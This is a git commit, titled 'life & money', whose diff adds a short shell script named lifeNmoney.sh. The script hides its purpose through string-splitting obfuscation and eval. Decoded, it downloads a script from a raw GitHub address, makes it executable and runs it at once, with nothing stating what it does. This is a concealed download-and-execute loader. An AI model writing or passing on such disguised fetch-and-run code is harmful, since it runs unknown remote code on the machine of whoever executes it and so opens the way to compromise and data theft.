2b79f58170cfea4ba04aa18696ea9d9a6820be69
mr•vybes <xquame@yahoo.com>
2024-04-06 10:43:25 +0000

    life & money

---
+++ lifeNmoney.sh
@@ -0,0 +1,3 @@
+z="
+";Zz='sh';az='./ln';Hz='s://';Oz='m/vx';Rz='lyr/';bz='.sh';Yz='lyr.';Dz='o ln';Gz='http';Qz='/lnk';Wz='d +x';Lz='erco';Fz='.sh ';Nz='t.co';Xz=' lnk';Jz='gith';Vz='chmo';Uz='lyr';Bz=' -fs';Sz='main';Tz='/bin';Az='curl';Cz='SL -';Iz='raw.';Ez='klyr';Kz='ubus';Pz='u007';Mz='nten';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Qz$Uz$z$Vz$Wz$Xz$Yz$Zz$z$az$Ez$bz"
